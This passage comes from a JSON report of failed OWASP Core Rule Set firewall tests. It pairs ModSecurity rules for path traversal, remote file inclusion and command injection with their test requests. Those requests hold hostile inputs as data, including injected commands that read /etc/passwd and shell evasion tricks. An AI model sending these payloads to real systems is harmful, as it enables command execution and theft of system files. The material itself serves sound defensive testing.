    "tested_rule" : [ "SecRule REQUEST_URI_RAW|ARGS|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|FILES|XML:/* \"@rx (?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])\" \"id:930110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:removeNulls,\\\n  t:cmdLine,\\\n  msg:'Path Traversal Attack (/../) or (/.../)',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-lfi',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-LFI',\\\n  tag:'capec/1000/255/153/126',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  multiMatch,\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.lfi_score=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "930110",
    "test_id" : 12,
    "test_path" : "REQUEST-930-APPLICATION-ATTACK-LFI/930110.yaml",
    "description" : "Path Traversal Attack (;..;) query string",
    "cause" : "failed expect_id check: 930110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "Path Traversal Attack (;..;) query string",
      "stages" : [ {
        "input" : {
          "dest_addr" : "localhost",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "X-FTW" : "This should trip",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/get?a=..;.\\.;\\.",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 930110 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_URI_RAW|ARGS|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|FILES|XML:/* \"@rx (?:(?:^|[\\x5c/;])\\.{2,3}[\\x5c/;]|[\\x5c/;]\\.{2,3}[\\x5c/;])\" \"id:930110,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:utf8toUnicode,\\\n  t:urlDecodeUni,\\\n  t:removeNulls,\\\n  t:cmdLine,\\\n  msg:'Path Traversal Attack (/../) or (/.../)',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-lfi',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-LFI',\\\n  tag:'capec/1000/255/153/126',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  multiMatch,\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.lfi_score=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "931100",
    "test_id" : 3,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931100.yaml",
    "description" : "Remote File Inclusion Attack (931100) - POST XML",
    "cause" : "failed expect_id check: 931100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=1 rule_id=920420 - Request content type is not allowed by policy", "phase=1 rule_id=920620 - Multiple Content-Type Request Headers", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=933190 - PHP Injection Attack: PHP Closing Tag Found", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Remote File Inclusion Attack (931100) - POST XML",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate",
            "Host" : "localhost",
            "Keep-Alive" : "300",
            "Referer" : "http",
            "User-Agent" : "OWASP CRS test agent",
            "Content-type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/api/",
          "data" : "<?xml version=\"1.0\" encoding=\"UTF-8\"?><catalog><tag>ftp%3A%2F%2F1.1.1.1</tag></catalog>",
          "port" : 80,
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 931100 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS|XML:/* \"@rx (?i)^(file|ftps?|https?|ssh)://(?:\\[?[a-f0-9]+:[a-f0-9:]+\\]?|\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\" \"id:931100,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:urlDecodeUni,\\\n  msg:'Possible Remote File Inclusion (RFI) Attack: URL Parameter using IP Address',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-rfi',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RFI',\\\n  tag:'capec/1000/152/175/253',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rfi_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "931130",
    "test_id" : 9,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931130.yaml",
    "description" : "Matching hosts",
    "cause" : "failed no_expect_ids check: 931130 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "Matching hosts",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "example.com",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=https://example.com/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 931130 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS \"@rx (?i)(?:(?:url|jar):)?(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://?(?:[^@]+@)?([^/]*)\" \"id:931130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-rfi',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RFI',\\\n  tag:'capec/1000/152/175/253',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rfi_parameter_%{MATCHED_VAR_NAME}=.%{tx.1}',\\\n  chain\"", "SecRule TX:/rfi_parameter_.*/ \"!@endsWith .%{request_headers.host}\" \"setvar:'tx.rfi_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "931130",
    "test_id" : 11,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931130.yaml",
    "description" : "Subdomains",
    "cause" : "failed no_expect_ids check: 931130 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "Subdomains",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "example.com",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=http://www.example.com/some/path",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 931130 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS \"@rx (?i)(?:(?:url|jar):)?(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://?(?:[^@]+@)?([^/]*)\" \"id:931130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-rfi',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RFI',\\\n  tag:'capec/1000/152/175/253',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rfi_parameter_%{MATCHED_VAR_NAME}=.%{tx.1}',\\\n  chain\"", "SecRule TX:/rfi_parameter_.*/ \"!@endsWith .%{request_headers.host}\" \"setvar:'tx.rfi_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "931130",
    "test_id" : 15,
    "test_path" : "REQUEST-931-APPLICATION-ATTACK-RFI/931130.yaml",
    "description" : "basic auth",
    "cause" : "failed no_expect_ids check: 931130 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "basic auth",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "example.com",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?x=http://foo:bar@example.com/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 931130 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS \"@rx (?i)(?:(?:url|jar):)?(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://?(?:[^@]+@)?([^/]*)\" \"id:931130,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-rfi',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RFI',\\\n  tag:'capec/1000/152/175/253',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.rfi_parameter_%{MATCHED_VAR_NAME}=.%{tx.1}',\\\n  chain\"", "SecRule TX:/rfi_parameter_.*/ \"!@endsWith .%{request_headers.host}\" \"setvar:'tx.rfi_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "932180",
    "test_id" : 2,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932180.yaml",
    "description" : "Test file upload with multipart/form-data and filename config.yml",
    "cause" : "failed expect_id check: 932180 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Test file upload with multipart/form-data and filename config.yml",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=----WebKitFormBoundaryABCDEFGIJKLMNOPQ"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"config\"; filename=\"config.yml\"\nContent-Type: text/yaml\n\n... Some content ...\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ\nContent-Disposition: form-data; name=\"image\"; filename=\"test.png\"\nContent-Type: image/png\n\nBINARYDATA\n------WebKitFormBoundaryABCDEFGIJKLMNOPQ--\n"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932180 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule FILES|REQUEST_HEADERS:X-Filename|REQUEST_HEADERS:X_Filename|REQUEST_HEADERS:X-File-Name \"@pmFromFile restricted-upload.data\" \"id:932180,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Restricted File Upload Attempt',\\\n  logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-rce',\\\n  tag:'paranoia-level/1',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RCE',\\\n  tag:'capec/1000/152/248/88',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  chain\"", "SecRule MATCHED_VARS \"!@rx (?i)(?:\\.boto|buddyinfo|mtrr|acpi|zoneinfo)\\B\" \"t:none,\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "932200",
    "test_id" : 13,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932200.yaml",
    "description" : "Test correct logging",
    "cause" : "nothing checked for test 13",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932235 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932200 - RCE Bypass Technique", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=932190 - Remote Command Execution: Wildcard bypass technique attempt", "phase=2 rule_id=932190 - Remote Command Execution: Wildcard bypass technique attempt", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942440 - SQL Comment Sequence Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "Test correct logging",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?host=www.google.com;/bin/ca?+/et*/passwd",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "match_regex" : "found within ARGS:host:"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* \"@rx ['\\*\\?\\x5c`][^\\n/]+/|/[^/]+?['\\*\\?\\x5c`]|\\$[!#\\$\\(\\*\\-0-9\\?-\\[_a-\\{]\" \"id:932200,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  t:urlDecodeUni,\\\n  msg:'RCE Bypass Technique',\\\n  logdata:'Matched Data: %{TX.0} found within %{TX.932200_MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-rce',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RCE',\\\n  tag:'capec/1000/152/248/88',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.932200_matched_var_name=%{matched_var_name}',\\\n  chain\"", "SecRule MATCHED_VARS \"@rx /\" \"t:none,\\\n  chain\"", "SecRule MATCHED_VARS \"@rx \\s\" \"t:none,\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "932207",
    "test_id" : 7,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932207.yaml",
    "description" : "Referer with command injection in URL Fragment",
    "cause" : "nothing checked for test 7",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=932207 - RCE Bypass Technique", "phase=1 rule_id=932237 - Remote Command Execution: Unix Shell Code Found in REQUEST_HEADERS" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "Referer with command injection in URL Fragment",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Referer" : "https://www.google.com/?param=something#x=foo;cat$u+/etc$u/passwd"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.0"
        },
        "output" : {
          "log" : {
            "match_regex" : "Matched Data: \\$u found within REQUEST_HEADERS:Referer: #x=foo;cat\\$u /etc\\$u/passwd"
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_HEADERS:Referer \"@rx #.*\" \"id:932207,\\\n  phase:1,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  t:lowercase,\\\n  t:urlDecodeUni,\\\n  msg:'RCE Bypass Technique',\\\n  logdata:'Matched Data: %{TX.0} found within %{TX.932207_MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-rce',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RCE',\\\n  tag:'capec/1000/152/248/88',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.932207_matched_var_name=%{matched_var_name}',\\\n  chain\"", "SecRule TX:0 \"@rx ['\\*\\?\\x5c`][^\\n/]+/|/[^/]+?['\\*\\?\\x5c`]|\\$[!#\\$\\(\\*\\-0-9\\?-\\[_a-\\{]\" \"capture,\\\n  t:none,\\\n  chain\"", "SecRule MATCHED_VAR \"@rx /\" \"t:none,\\\n  chain\"", "SecRule MATCHED_VAR \"@rx \\s\" \"t:none,\\\n  chain\"", "SecRule MATCHED_VAR \"!@beginsWith #:~:text=\" \"t:none,\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "932240",
    "test_id" : 3,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "globbing technique 3: una$$me -a in cookies (BB S01X1GRV)",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "globbing technique 3: una$$me -a in cookies (BB S01X1GRV)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Cookie" : "una$$me -a"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS|XML:/* \"@rx (?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+\" \"id:932240,\\\n  phase:2,\\\n  block,\\\n  capture,\\\n  t:none,\\\n  msg:'Remote Command Execution: Unix Command Injection evasion attempt detected',\\\n  logdata:'Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-shell',\\\n  tag:'platform-unix',\\\n  tag:'attack-rce',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/ATTACK-RCE',\\\n  tag:'capec/1000/152/248/88',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'CRITICAL',\\\n  setvar:'tx.932240_matched_var_name=%{matched_var_name}',\\\n  chain\"", "SecRule MATCHED_VARS \"!@rx [0-9]\\s*\\'\\s*[0-9]\" \"t:none,\\\n  setvar:'tx.rce_score=+%{tx.critical_anomaly_score}',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'\"" ]
  }, {
    "test_rule" : "932240",
    "test_id" : 4,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "globbing technique 4: uname$u -a (BB S01X1GRV)",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "globbing technique 4: uname$u -a (BB S01X1GRV)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
